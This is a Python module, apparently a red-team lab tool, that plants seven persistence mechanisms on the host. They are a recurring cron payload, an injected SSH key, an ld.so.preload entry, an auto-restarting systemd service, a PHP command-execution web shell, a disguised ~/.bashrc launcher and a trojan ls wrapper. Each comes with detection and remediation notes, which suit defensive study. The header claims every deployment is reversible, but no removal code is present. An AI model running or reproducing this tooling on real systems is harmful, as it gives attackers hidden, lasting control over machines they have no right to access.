"""
Persistence Engine — deploys reversible persistence mechanisms for lab testing.

Each mechanism reports: name, type, deployed status, path, detection_method,
remediation_steps, and any error message.

Safe for lab use only — all deployments are reversible.
"""

import os
import subprocess
import tempfile
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional


@dataclass
class PersistenceMechanism:
    name: str
    type: str
    deployed: bool
    path: str
    detection_method: str
    remediation_steps: list = field(default_factory=list)
    error: str = ""


@dataclass
class PersistenceReport:
    host: str
    mechanisms: list
    timestamp: str = ""

    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now(timezone.utc).isoformat()

    @property
    def deployed_count(self) -> int:
        return sum(1 for m in self.mechanisms if m.deployed)


def _run_cmd(cmd: list[str], check: bool = True) -> subprocess.CompletedProcess:
    """Run a subprocess and return the result."""
    return subprocess.run(cmd, capture_output=True, text=True, check=check)


def _deploy_cron(payload: str) -> PersistenceMechanism:
    """Add a cron job that runs the payload every 5 minutes."""
    name = "cron"
    detection = "crontab -l shows suspicious scheduled task"
    remediation = ["crontab -e and remove the malicious entry", "check /etc/cron.d/ for rogue files"]
    cron_entry = f"*/5 * * * * {payload} >/dev/null 2>&1"

    try:
        existing = _run_cmd(["crontab", "-l"], check=False)
        current = existing.stdout.strip() if existing.returncode == 0 else ""
        if current:
            new_crontab = current + "\n" + cron_entry
        else:
            new_crontab = cron_entry

        proc = subprocess.run(
            ["crontab", "-"],
            input=new_crontab + "\n",
            capture_output=True,
            text=True,
            check=True,
        )
        return PersistenceMechanism(
            name=name,
            type="scheduled_task",
            deployed=True,
            path="user crontab",
            detection_method=detection,
            remediation_steps=remediation,
        )
    except Exception as e:
        return PersistenceMechanism(
            name=name,
            type="scheduled_task",
            deployed=False,
            path="user crontab",
            detection_method=detection,
            remediation_steps=remediation,
            error=str(e),
        )


def _deploy_ssh_key(payload: str) -> PersistenceMechanism:
    """Add an SSH public key to ~/.ssh/authorized_keys."""
    name = "ssh_key"
    detection = "~/.ssh/authorized_keys contains unknown public key"
    remediation = ["review ~/.ssh/authorized_keys and remove unrecognised entries", "rotate all SSH keys"]
    ssh_dir = Path.home() / ".ssh"
    auth_keys = ssh_dir / "authorized_keys"

    try:
        ssh_dir.mkdir(mode=0o700, exist_ok=True)

        test_key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5LAB_TEST_KEY_PERSISTENCE_ENGINE_DO_NOT_USE_IN_PRODUCTION lab-persistence@test"

        existing = ""
        if auth_keys.exists():
            existing = auth_keys.read_text()

        if test_key not in existing:
            with auth_keys.open("a") as f:
                f.write(test_key + "\n")
            auth_keys.chmod(0o600)

        return PersistenceMechanism(
            name=name,
            type="credential",
            deployed=True,
            path=str(auth_keys),
            detection_method=detection,
            remediation_steps=remediation,
        )
    except Exception as e:
        return PersistenceMechanism(
            name=name,
            type="credential",
            deployed=False,
            path=str(auth_keys),
            detection_method=detection,
            remediation_steps=remediation,
            error=str(e),
        )


def _deploy_ld_preload(payload: str) -> PersistenceMechanism:
    """Add an entry to /etc/ld.so.preload (requires root)."""
    name = "ld_preload"
    detection = "/etc/ld.so.preload contains unexpected library path; ldd shows injected libs"
    remediation = ["remove the entry from /etc/ld.so.preload", "audit shared libraries with ldd", "check LD_PRELOAD env var"]
    preload_file = Path("/etc/ld.so.preload")
    fake_lib = "/tmp/.libpersist.so"

    try:
        if os.geteuid() != 0:
            raise PermissionError("root required for /etc/ld.so.preload")

        if not Path(fake_lib).exists():
            Path(fake_lib).touch()

        existing = ""
        if preload_file.exists():
            existing = preload_file.read_text()

        if fake_lib not in existing:
            with preload_file.open("a") as f:
                f.write(fake_lib + "\n")

        return PersistenceMechanism(
            name=name,
            type="rootkit",
            deployed=True,
            path=str(preload_file),
            detection_method=detection,
            remediation_steps=remediation,
        )
    except Exception as e:
        return PersistenceMechanism(
            name=name,
            type="rootkit",
            deployed=False,
            path=str(preload_file),
            detection_method=detection,
            remediation_steps=remediation,
            error=str(e),
        )


def _deploy_systemd(payload: str) -> PersistenceMechanism:
    """Create a systemd user service."""
    name = "systemd"
    detection = "systemctl --user list-units shows unknown service; journalctl reveals startup"
    remediation = ["systemctl --user stop evilkit-cache.service", "systemctl --user disable evilkit-cache.service", "rm the .service file", "systemctl --user daemon-reload"]

    service_name = "evilkit-cache.service"
    systemd_dir = Path.home() / ".config" / "systemd" / "user"
    service_file = systemd_dir / service_name

    try:
        systemd_dir.mkdir(parents=True, exist_ok=True)

        unit_section = "[Unit]"
        desc_line = "Description=Evilkit Cache Service"
        after_line = "After=network.target"
        service_section = "[Service]"
        exec_line = f"ExecStart={payload}"
        restart_line = "Restart=always"
        restart_sec = "RestartSec=60"
        install_section = "[Install]"
        wanted_by = "WantedBy=default.target"

        content = unit_section + "\n" + desc_line + "\n" + after_line + "\n\n" + service_section + "\n" + exec_line + "\n" + restart_line + "\n" + restart_sec + "\n\n" + install_section + "\n" + wanted_by + "\n"

        service_file.write_text(content)

        try:
            _run_cmd(["systemctl", "--user", "daemon-reload"], check=False)
            _run_cmd(["systemctl", "--user", "enable", service_name], check=False)
        except Exception:
            pass

        return PersistenceMechanism(
            name=name,
            type="service",
            deployed=True,
            path=str(service_file),
            detection_method=detection,
            remediation_steps=remediation,
        )
    except Exception as e:
        return PersistenceMechanism(
            name=name,
            type="service",
            deployed=False,
            path=str(service_file),
            detection_method=detection,
            remediation_steps=remediation,
            error=str(e),
        )


def _deploy_webshell(payload: str) -> PersistenceMechanism:
    """Create a simple web shell file."""
    name = "webshell"
    detection = "web root contains .shell.php with command execution capability"
    remediation = ["delete the webshell file", "audit web root for unknown PHP files", "review web server access logs for POST requests"]

    webshell_path = Path("/tmp/.shell.php")
    shell_content = "<?php "
    shell_content += "if (isset($_REQUEST['cmd'])) { "
    shell_content += "echo '<pre>'; "
    shell_content += "system($_REQUEST['cmd']); "
    shell_content += "echo '</pre>'; "
    shell_content += "} "
    shell_content += "?>"

    try:
        webshell_path.write_text(shell_content)
        return PersistenceMechanism(
            name=name,
            type="webshell",
            deployed=True,
            path=str(webshell_path),
            detection_method=detection,
            remediation_steps=remediation,
        )
    except Exception as e:
        return PersistenceMechanism(
            name=name,
            type="webshell",
            deployed=False,
            path=str(webshell_path),
            detection_method=detection,
            remediation_steps=remediation,
            error=str(e),
        )


def _deploy_bashrc(payload: str) -> PersistenceMechanism:
    """Append to ~/.bashrc or ~/.bash_profile."""
    name = "bashrc"
    detection = "~/.bashrc contains unexpected payload invocation at end of file"
    remediation = ["edit ~/.bashrc and remove the malicious lines", "check ~/.bash_profile and ~/.profile similarly", "review shell init files for all users"]

    bashrc = Path.home() / ".bashrc"
    trigger_line = "# cache maintenance"
    exec_line = f"[ -x {payload} ] && {payload} --background &>/dev/null &"

    try:
        existing = ""
        if bashrc.exists():
            existing = bashrc.read_text()

        if trigger_line not in existing:
            with bashrc.open("a") as f:
                f.write("\n" + trigger_line + "\n" + exec_line + "\n")

        return PersistenceMechanism(
            name=name,
            type="startup_script",
            deployed=True,
            path=str(bashrc),
            detection_method=detection,
            remediation_steps=remediation,
        )
    except Exception as e:
        return PersistenceMechanism(
            name=name,
            type="startup_script",
            deployed=False,
            path=str(bashrc),
            detection_method=detection,
            remediation_steps=remediation,
            error=str(e),
        )


def _deploy_binary_replacement(payload: str) -> PersistenceMechanism:
    """Replace a common binary with a wrapper (requires root)."""
    name = "binary_replacement"
    detection = "binary checksum mismatch; file shows unexpected script wrapper; strings reveals payload path"
    remediation = ["restore original binary from package manager", "verify checksums with rpm -V or dpkg --verify", "audit /usr/bin for script wrappers"]

    target_binary = Path("/usr/local/bin/ls_wrapper_test")

    try:
        if os.geteuid() != 0:
            raise PermissionError("root required for binary replacement")

        wrapper_content = "#!/bin/bash\n"
        wrapper_content += f"# Wrapper for ls\n"
        wrapper_content += f"{payload} &>/dev/null &\n"
        wrapper_content += f"/bin/ls \"$@\"\n"

        target_binary.write_text(wrapper_content)
        target_binary.chmod(0o755)

        return PersistenceMechanism(
            name=name,
            type="trojan",
            deployed=True,
            path=str(target_binary),
            detection_method=detection,
            remediation_steps=remediation,
        )
    except Exception as e:
        return PersistenceMechanism(
            name=name,
            type="trojan",
            deployed=False,
            path=str(target_binary),
            detection_method=detection,
            remediation_steps=remediation,
            error=str(e),
        )


ALL_MECHANISMS = {
    "cron": _deploy_cron,
    "ssh_key": _deploy_ssh_key,
    "ld_preload": _deploy_ld_preload,
    "systemd": _deploy_systemd,
    "webshell": _deploy_webshell,
    "bashrc": _deploy_bashrc,
    "binary_replacement": _deploy_binary_replacement,
}


def deploy_persistence(
    host: str = "localhost",
    payload: str = "/tmp/.cache",
    mechanisms: Optional[str] = None,
) -> PersistenceReport:
    """
    Deploy persistence mechanisms on the local system.

    Args:
        host: Host identifier (default: localhost)
        payload: Path to the payload executable (default: /tmp/.cache)
        mechanisms: Comma-separated list of mechanism names, or None for all

    Returns:
        PersistenceReport with results for each mechanism
    """
    if mechanisms is None or mechanisms == "":
        selected = list(ALL_MECHANISMS.keys())
    elif isinstance(mechanisms, str):
        selected = [m.strip() for m in mechanisms.split(",") if m.strip()]
    elif isinstance(mechanisms, list):
        selected = mechanisms
    else:
        selected = list(ALL_MECHANISMS.keys())

    results = []
    for name in selected:
        func = ALL_MECHANISMS.get(name)
        if func is None:
            results.append(PersistenceMechanism(
                name=name,
                type="unknown",
                deployed=False,
                path="",
                detection_method=f"unknown mechanism: {name}",
                remediation_steps=["remove from mechanisms list"],
                error=f"unknown mechanism: {name}",
            ))
        else:
            results.append(func(payload))

    return PersistenceReport(host=host, mechanisms=results)
